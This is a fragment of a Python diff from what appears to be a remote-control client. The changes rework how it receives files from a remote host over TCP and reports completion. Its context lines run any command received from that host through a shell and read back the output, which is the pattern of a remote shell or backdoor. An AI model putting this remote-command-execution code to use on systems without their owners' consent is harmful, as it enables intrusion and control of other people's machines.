@@ -82,16 +82,18 @@ try:
             try:
                 tcp_connection.connect((REMOTE_HOST, REMOTE_TRANSFER_PORT))
                 f = open(file_name, 'a')
-                current_input = commands.from_byte(tcp_connection.recv(tcp_buffer_size).decode())
-                print(current_input)
+
+                current_input = tcp_connection.recv(tcp_buffer_size).decode()
                 while commands.str_to_command(current_input) != Commands.END_TRANSFER:
-                    current_input = tcp_connection.recv(tcp_buffer_size).decode()
-                    print(current_input)
                     f.write(current_input)
+                    print(current_input)
+                    tcp_connection.send(commands.to_byte(Commands.FILE))
+                    current_input = tcp_connection.recv(tcp_buffer_size).decode()
 
             finally:
                 tcp_connection.close()
                 f.close()
+                s.sendto(b'Finished file transfer.', (REMOTE_HOST, REMOTE_PORT))
         elif command is not None:
             op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = op.stdout.read()
